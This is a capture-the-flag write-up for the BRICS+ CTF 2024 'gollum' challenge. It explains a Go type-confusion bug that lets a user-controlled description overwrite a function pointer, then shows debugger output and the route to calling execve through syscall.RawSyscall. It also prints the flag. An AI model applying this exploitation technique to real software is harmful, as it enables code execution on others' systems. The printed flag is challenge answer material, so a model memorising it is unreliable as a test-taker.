# BRICS+ CTF 2024 | gollum

## Description

> In the depths of Orodruin I have found a new type of database.
>
> It stores users and passwords within the single structure.
>
> I hope it's safe. I use it in production anyway.

## Public archive

- [public/gollum.tar.gz](public/gollum.tar.gz)

## Deploy

```
cd deploy && docker compose up --build -d
```

## Solution

The service is written in [Go](https://go.dev/). It implements the simple text-based interface.

There are two suspicious parts in the [src/database/database.go](src/database/database.go) file:

```go
type debugEntry[T any] struct {
    Credential models.Credential
}

entry := debugEntry[int]{credential}
fmt.Sprintf("[DEBUG] Added credential entry %v\n", entry)

// ...

type debugEntry[T any] struct {
    User models.User
}

entry := debugEntry[int]{user}
fmt.Sprintf("[DEBUG] Added user entry %v\n", entry)
```

This is a type definition inside the function. The defined `debugEntry[T]` object is used in DEBUG logging, but the logging itself is used incorrectly. Function [fmt.Sprintf](https://pkg.go.dev/fmt#Sprintf) doesn't print anything, it just returns the string as a return value (the IDE will notice this as unused result warning).

If we change it to `fmt.Printf` we could see the unexpected behaviour:

```
> ./gollum
[!] Hello! Please, use `HELP` for available commands.
> REGISTER
[?] Please, enter username: hacker
[?] Please, enter password: hacker1337
[?] Please, enter password protection mode: sha256
[DEBUG] Added credential entry {fd1***a1e}
[DEBUG] Added user entry {***}
[+] Registered successfully.
>
```

At the second DEBUG line we expect a call to `User.String()` which should output the username "hacker". But the service calls `Credential.String()` instead for both user and credential entries.

This is the type confusion vulnerability, the service interprets `User` object as a `Credential` object. Let's look at the `Credential` struct:

```go
type HashFunc func(Credential) string

type Credential struct {
	created time.Time

	hashFunc HashFunc
	password string
}
```

There is a function pointer `hashFunc` inside the structure at offset 0x18. This pointer is accessed in `Credential.String()` function:

```go
func (credential Credential) String() string {
	var hash string

	if credential.hashFunc != nil {
		hash = credential.hashFunc(credential)
		hash = hash[:3] + "***" + hash[len(hash)-3:]
	} else {
		hash = "***"
	}

	return hash
}
```

Let's look at the `User` struct:

```go
type User struct {
	Id          int
	Name        string
	Description string

	CredentialId int
}
```

There is a string `Description` at the offset 0x18. We can control the user's description using `UPDATE` handler. Let's trigger the arbitrary call:

```
[!] Hello! Please, use `HELP` for available commands.
> REGISTER
[?] Please, enter username: AAAAAAAA
[?] Please, enter password: BBBBBBBB
[?] Please, enter password protection mode: sha256
[DEBUG] Added credential entry {2f8***890}
[DEBUG] Added user entry {***}
[+] Registered successfully.
> UPDATE
[?] Please, enter description: CCCCCCCC
[+] Description updated.
> LOGOUT
> LOGIN
[?] Please, enter username: AAAAAAAA
[?] Please, enter password: BBBBBBBB
[+] Logged in successfully.
> LOGOUT
> REGISTER
[?] Please, enter username: DDDDDDDD
[?] Please, enter password: EEEEEEEE
[?] Please, enter password protection mode: sha256
[DEBUG] Added credential entry {0c6***574}

Thread 1 "gollum" received signal SIGSEGV, Segmentation fault.
```

Notice the `call r9` instruction which caused the segfault:

```
     0x49b48e <gollum/models.Credential.String+78> mov    rbx, QWORD PTR [rsp+0x50]
     0x49b493 <gollum/models.Credential.String+83> mov    r9, QWORD PTR [rdi]
     0x49b496 <gollum/models.Credential.String+86> mov    rdx, rdi
 →   0x49b499 <gollum/models.Credential.String+89> call   r9
     0x49b49c <gollum/models.Credential.String+92> nop    DWORD PTR [rax+0x0]
     0x49b4a0 <gollum/models.Credential.String+96> cmp    rbx, 0x3
     0x49b4a4 <gollum/models.Credential.String+100> jb     0x49b4d4 <gollum/models.Credential.String+148>
     0x49b4a6 <gollum/models.Credential.String+102> lea    r8, [rbx+rax*1]
     0x49b4aa <gollum/models.Credential.String+106> lea    r8, [r8-0x3]
```

Let's look at the registers:

```
$rax   : 0x3
$rbx   : 0x000000c0000ae040  →  "DDDDDDDD\n"
$rcx   : 0x8
$rdx   : 0x000000c000018106  →  "CCCCCCCC\n"
$rsp   : 0x000000c0000791c8  →  0xc1b093dfcccaa2a2
$rbp   : 0x000000c000079200  →  0x000000c000079270  →  ...
$rsi   : 0x8
$rdi   : 0x000000c000018106  →  "CCCCCCCC\n"
$rip   : 0x000000000049b499  →  <gollum/models.Credential.String+89> call r9
$r8    : 0x2
$r9    : 0x4343434343434343 ("CCCCCCCC"?)
$r10   : 0x1a
$r11   : 0x000000c0000b6000  →  "[DEBUG] Added user entry {ntry {0c6***574}\n comma[...]"
$r12   : 0x0
$r13   : 0x19
$r14   : 0x000000c0000061a0  →  0x000000c000078000  →  0x0000000000000000
$r15   : 0x40
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
```

It calls the `0x4343434343434343` ("CCCCCCCC") address. Go passes the function arguments in the registers `rax`, `rbx`, `rcx` and `rdx`, and we immediately got the control over the function arguments:

```
rax -> 0x3 (user ID)
rbx -> 0x000000c0000ae040  →  "DDDDDDDD\n" (user name)
rcx -> 0x8 (user name length)
rdx -> 0x000000c000018106  →  "CCCCCCCC\n" (user description)
```

Let's search the available functions inside the binary:

```
> nm ./gollum | grep -i syscall
...
000000000047abe0 T syscall.RawSyscall
0000000000402680 T syscall.RawSyscall6
...
```

Since there is no PIE we already know the address of the target function. So we can simply call `execve()` syscall.

Example solver: [solution/sploit.py](solution/sploit.py)

*Note: the intended solution doesn't require a searching for the specific bug in Go compiler since the trigger could be noticed by DEBUG logging. But there is an issue for this bug: https://github.com/golang/go/issues/54456*

## Flag

```
brics+{they_sh0uld_rewr1te_Go_in_Rust_idk}
```
